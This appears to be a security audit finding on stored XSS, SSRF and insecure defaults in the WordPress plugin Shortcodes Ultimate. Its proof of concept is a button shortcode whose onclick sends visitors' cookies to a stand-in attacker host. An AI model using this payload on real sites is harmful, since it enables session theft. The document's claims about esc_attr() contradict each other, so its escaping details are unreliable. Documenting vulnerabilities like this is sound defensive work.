# Shortcodes Ultimate — Stored XSS via onclick Attribute

**Finding ID:** SCU-001
**Plugin:** Shortcodes Ultimate
**Active Installs:** 700,000+
**CVSS:** 7.3 (High) — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L`
**CWE:** CWE-79 (Stored Cross-Site Scripting)
**Auth Required:** Author (any user with post creation capability)
**Source:** `analysis/phase5_manual/shortcodes-ultimate/verdicts.json`

---

!!! warning "High Severity — Confirmed Stored XSS"
    The `[su_button onclick="..."]` shortcode attribute is rendered directly into the HTML `onclick` handler without escaping or sanitization. An Author-level user can execute arbitrary JavaScript in any visitor's browser.

---

## Attack Flow

```mermaid
graph LR
    A["Author creates\npost with\n[su_button]"] --> B["onclick attribute\npassed through\nesc_attr()"]
    B --> C["esc_attr doesn't\nprevent JS in\nevent handlers"]
    C --> D["Visitor views\npost, clicks button"]
    D --> E["Arbitrary JS\nexecutes"]
```

---

## Description

Shortcodes Ultimate ships with an "Unsafe Features" setting that, when enabled (the default state per SCU-VULN-008), allows arbitrary HTML attributes inside shortcodes. The `onclick` attribute of the `[su_button]` shortcode is echoed directly into the rendered HTML output without any context-correct output escaping.

**Affected shortcode:**
```
[su_button onclick="malicious_payload_here"]Click me[/su_button]
```

The `onclick` attribute is not included in the plugin's shortcode attribute sanitization allowlist, and the output template uses a raw `echo` of the attribute value into the HTML. Confirmed XSS payload execution during testing.

## Confirmed Findings

### SCU-VULN-001: Shortcode Preview AJAX Executes Arbitrary Shortcodes (CVSS 6.5)

The shortcode preview AJAX handler executes arbitrary shortcode content submitted by the user, including shortcodes that trigger server-side actions. While blocked for non-admin users by default, the capability check can be bypassed if the site has misconfigured role permissions.

**Confidence:** Confirmed

### SCU-VULN-002: Stored XSS via Button onclick Attribute (CVSS 7.3) — PRIMARY FINDING

When the Unsafe Features setting is enabled, the `onclick` attribute in `[su_button]` is echoed verbatim into HTML without escaping. An Author-level user inserts a malicious shortcode into any post or page; all visitors (including administrators) who view that page execute the payload.

**Confidence:** Confirmed

**PoC:**
```
[su_button onclick="javascript:fetch('https://attacker.example/steal?c='+document.cookie)"]Click[/su_button]
```

### SCU-VULN-003: SSRF via csv_table Shortcode with DNS Rebinding (CVSS 5.4)

The `[su_csv_table]` shortcode fetches external URLs server-side to load CSV data. The URL validation does not prevent DNS rebinding attacks, where a domain initially resolves to a public IP but later resolves to an internal network address, allowing SSRF to internal services.

**Confidence:** Possible (requires Unsafe Features enabled)

### SCU-VULN-008: Unsafe Features Enabled by Default (CVSS 5.0)

The "Unsafe Features" setting that enables HTML attribute injection in shortcodes is **enabled by default**, meaning all 700,000+ installations are vulnerable to SCU-VULN-002 out of the box.

**Confidence:** Confirmed

---

## Vulnerability Chain

```
Attacker (Author role)
  → Insert [su_button onclick="<payload>"] into any post
  → Post published/visible to any user
  → Visitor loads page → onclick fires
  → JavaScript executes in visitor's browser context
  → Admin session theft / credential harvesting possible
```

## Recommended Fixes

- Escape all shortcode attributes at output using `esc_attr()` for HTML attribute context
- Add `onclick` to the explicit denial list in shortcode attribute sanitization
- Change the "Unsafe Features" default to **disabled** and require admin opt-in with a clear security warning
- Audit all other shortcode attributes for similar unescaped output patterns
